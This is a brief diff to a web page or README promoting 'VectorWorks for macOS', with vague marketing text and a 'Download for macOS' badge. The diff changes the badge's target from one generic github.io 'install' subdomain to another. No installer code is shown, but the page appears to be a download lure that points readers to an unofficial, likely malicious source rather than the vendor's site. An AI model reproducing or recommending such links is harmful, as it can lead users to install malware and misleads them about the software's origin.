@@ -6,7 +6,7 @@
 <h3>VectorWorks for macOS</h3>
 <p>VectorWorks concentrates on delivering a calm, consistent experience on macOS, reducing friction while tasks are created, managed, and completed.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/vv">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
